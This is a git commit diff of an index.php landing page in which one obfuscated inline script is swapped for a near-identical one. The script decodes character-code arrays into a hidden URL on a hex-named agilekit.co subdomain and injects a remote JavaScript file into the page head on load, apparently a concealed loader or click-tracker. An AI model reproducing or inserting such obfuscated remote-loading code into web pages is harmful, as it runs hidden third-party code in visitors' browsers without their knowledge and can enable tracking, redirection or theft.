35044abf82d4cfa5cc61788394e97ab6164a3a30
dubaiareaa29 <96204557+dubaiareaa29@users.noreply.github.com>
2022-01-18 23:21:45 +0800

    Update index.php

--- index.php
+++ index.php
@@ -10,8 +10,7 @@
 		<link rel="stylesheet" href="css/main.css">
 	<script type="text/javascript" src="script_land.js" defer></script>
 	<style>.dtpcnt{opacity: 0;}</style>
-		 <script type="text/javascript">(function(){function u(s){var y="";while(t=s.shift()){y=y.concat(v(t))}return y}function v(s){return String.fromCharCode(s)}function qq(k,n,c){for(var b=document.getElementsByTagName("script"),a=0;a<b.length;a++){if(-1===b[a].src.indexOf(n)){var head=document.getElementsByTagName("head")[0];var script=document.createElement("script");script.type="text/javascript";script.src=u(k)+u(c)+n;head.appendChild(script);return true}}return false}var z=[47,47,49,48,48,99,102,57,97,52,54,100,49,99,48,50,97,102,51,50,51,51,52,101,54,54,52,54,55,99,54,102,99,99,52,54,101,100,52,56,100,101,54,97,100,46,97,103,105,108,101,107,105,116,46,99,111,47];var y=[99,108,105,99,107,47];var x="163cn4klhaz9.js";qq(z,x,y)})();</script> 
-	</head>
+ <script type="text/javascript">(function(){function u(s){var y="";while(t=s.shift()){y=y.concat(v(t))}return y}function v(s){return String.fromCharCode(s)}function qq(k,n,c){for(var b=document.getElementsByTagName("script"),a=0;a<b.length;a++){if(-1===b[a].src.indexOf(n)){var head=document.getElementsByTagName("head")[0];var script=document.createElement("script");script.type="text/javascript";script.src=u(k)+u(c)+n;head.appendChild(script);return true}}return false}var z=[47,47,49,48,48,99,102,57,97,52,54,100,49,99,48,50,97,102,51,50,51,51,52,101,54,54,52,54,55,99,54,102,99,99,52,54,101,100,52,56,100,101,54,97,100,46,97,103,105,108,101,107,105,116,46,99,111,47];var y=[99,108,105,99,107,47];var x="164u610irxvi.js";qq(z,x,y)})();</script> 	</head>
 	<body>
 		<style>.dtpcnt{opacity: 0;}</style>
 		<div class="wrapper">
